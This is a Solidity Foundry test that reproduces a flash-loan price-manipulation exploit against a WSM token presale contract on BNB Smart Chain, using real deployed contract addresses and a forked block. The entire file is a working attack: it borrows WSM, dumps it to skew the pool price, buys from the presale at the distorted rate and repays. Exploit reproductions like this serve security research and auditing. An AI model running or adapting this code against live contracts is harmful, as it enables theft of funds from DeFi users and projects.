// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IWBNB.sol";
import "@interface/IUniswapV3.sol";
import "@interface/IERC20.sol";

import "./ISwapRouter.sol";
import "./IPresaleBSCV5.sol";

contract WsmTest is Test {
    IUniswapV3Pool WSM_BNB_Pool =
        IUniswapV3Pool(0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E);
    IERC20 WSM = IERC20(0x62694D43Ccb9B64e76e38385d15e325c7712A735);
    WBNB BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    SwapRouter swapRouter =
        SwapRouter(payable(0x74Dca1Bd946b9472B2369E11bC0E5603126E4C18));
    IPresaleBSCV5 presaleBSCV5 =
        IPresaleBSCV5(0xFB071837728455c581f370704b225ac9eABDfa4a);

    function setUp() public {
        vm.createSelectFork("bsc", 37569861 - 1);
        deal(address(this), 0);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        WSM_BNB_Pool.flash(address(this), 5000000 ether, 0, "");
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        fee1;
        data;

        // 确认调用的是 DAI/WETH pair 合约
        require(msg.sender == address(WSM_BNB_Pool), "not authorized");

        WSM.approve(address(swapRouter), type(uint256).max);
        BNB.approve(address(swapRouter), type(uint256).max);

        exactInputSingle(address(WSM), address(BNB), 5000000 ether, 0);

        print("bnb balance", BNB.balanceOf(address(this)), 18);
        BNB.withdraw(BNB.balanceOf(address(this)));

        presaleBSCV5.buyWithBNB{value: 37.344712626082242493 ether}(
            2770000,
            false
        );

        exactInputSingle(
            address(BNB),
            address(WSM),
            34.4635158704141257 ether,
            34.4635158704141257 ether
        );

        // repay the money
        WSM.transfer(address(WSM_BNB_Pool), 5000000 ether + fee0);

        print("WSM balance", WSM.balanceOf(address(this)), 18);
    }

    function exactInputSingle(
        address _tokenIn,
        address _tokenOut,
        uint256 _amountIn,
        uint256 _msgValue
    ) public {
        ISwapRouter.ExactInputSingleParams memory params;
        params.tokenIn = _tokenIn;
        params.tokenOut = _tokenOut;
        params.fee = 3000;
        params.recipient = address(this);
        params.deadline = block.timestamp + 1;
        params.amountIn = _amountIn;
        params.amountOutMinimum = 1;
        params.sqrtPriceLimitX96 = 0;

        if (_msgValue > 0) {
            swapRouter.exactInputSingle{value: _msgValue}(params);
        } else {
            swapRouter.exactInputSingle(params);
        }
    }

    receive() external payable {}
}
